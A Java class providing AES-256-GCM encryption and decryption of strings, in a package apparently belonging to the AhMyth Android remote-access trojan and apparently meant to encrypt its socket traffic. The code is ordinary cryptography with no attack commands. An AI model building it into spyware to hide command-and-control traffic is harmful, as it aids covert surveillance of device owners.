package ahmyth.mine.king.ahmyth.crypto;

import android.util.Base64;
import android.util.Log;

import javax.crypto.Cipher;
import javax.crypto.spec.GCMParameterSpec;
import javax.crypto.spec.SecretKeySpec;
import java.nio.ByteBuffer;
import java.security.SecureRandom;

public class SocketEncryption {
    
    private static final String TAG = "SocketEncryption";
    private static final String ALGORITHM = "AES/GCM/NoPadding";
    private static final int KEY_LENGTH = 32; // 256 bits
    private static final int IV_LENGTH = 16;  // 128 bits
    private static final int TAG_LENGTH = 128; // 128 bits for GCM tag
    
    private SecretKeySpec secretKey;
    
    public SocketEncryption() {
    }
    
    /**
     * Set the encryption key
     * @param keyBytes 32-byte encryption key
     */
    public void setKey(byte[] keyBytes) {
        if (keyBytes == null || keyBytes.length != KEY_LENGTH) {
            throw new IllegalArgumentException("Key must be " + KEY_LENGTH + " bytes");
        }
        this.secretKey = new SecretKeySpec(keyBytes, "AES");
    }
    
    /**
     * Set the encryption key from Base64 string
     * @param keyBase64 Base64 encoded key
     */
    public void setKeyFromBase64(String keyBase64) {
        byte[] keyBytes = Base64.decode(keyBase64, Base64.DEFAULT);
        setKey(keyBytes);
    }
    
    /**
     * Generate a random encryption key
     * @return 32-byte encryption key
     */
    public static byte[] generateKey() {
        SecureRandom random = new SecureRandom();
        byte[] key = new byte[KEY_LENGTH];
        random.nextBytes(key);
        return key;
    }
    
    /**
     * Encrypt data using AES-256-GCM
     * @param data Data to encrypt
     * @return Base64 encoded encrypted data (iv + tag + ciphertext)
     */
    public String encrypt(String data) throws Exception {
        if (secretKey == null) {
            throw new IllegalStateException("Encryption key not set");
        }
        
        try {
            // Generate random IV
            byte[] iv = new byte[IV_LENGTH];
            SecureRandom random = new SecureRandom();
            random.nextBytes(iv);
            
            // Initialize cipher
            Cipher cipher = Cipher.getInstance(ALGORITHM);
            GCMParameterSpec parameterSpec = new GCMParameterSpec(TAG_LENGTH, iv);
            cipher.init(Cipher.ENCRYPT_MODE, secretKey, parameterSpec);
            
            // Encrypt data
            byte[] encrypted = cipher.doFinal(data.getBytes("UTF-8"));
            
            // Combine iv + encrypted data (tag is included in encrypted)
            ByteBuffer byteBuffer = ByteBuffer.allocate(IV_LENGTH + encrypted.length);
            byteBuffer.put(iv);
            byteBuffer.put(encrypted);
            byte[] combined = byteBuffer.array();
            
            // Return Base64 encoded
            return Base64.encodeToString(combined, Base64.NO_WRAP);
            
        } catch (Exception e) {
            Log.e(TAG, "Encryption error", e);
            throw e;
        }
    }
    
    /**
     * Decrypt data using AES-256-GCM
     * @param encryptedData Base64 encoded encrypted data
     * @return Decrypted data
     */
    public String decrypt(String encryptedData) throws Exception {
        if (secretKey == null) {
            throw new IllegalStateException("Encryption key not set");
        }
        
        try {
            // Decode from Base64
            byte[] combined = Base64.decode(encryptedData, Base64.NO_WRAP);
            
            // Extract IV and encrypted data
            ByteBuffer byteBuffer = ByteBuffer.wrap(combined);
            byte[] iv = new byte[IV_LENGTH];
            byteBuffer.get(iv);
            byte[] encrypted = new byte[byteBuffer.remaining()];
            byteBuffer.get(encrypted);
            
            // Initialize cipher
            Cipher cipher = Cipher.getInstance(ALGORITHM);
            GCMParameterSpec parameterSpec = new GCMParameterSpec(TAG_LENGTH, iv);
            cipher.init(Cipher.DECRYPT_MODE, secretKey, parameterSpec);
            
            // Decrypt data
            byte[] decrypted = cipher.doFinal(encrypted);
            
            return new String(decrypted, "UTF-8");
            
        } catch (Exception e) {
            Log.e(TAG, "Decryption error", e);
            throw e;
        }
    }
    
    /**
     * Check if encryption key is set
     * @return true if key is set
     */
    public boolean isKeySet() {
        return secretKey != null;
    }
}

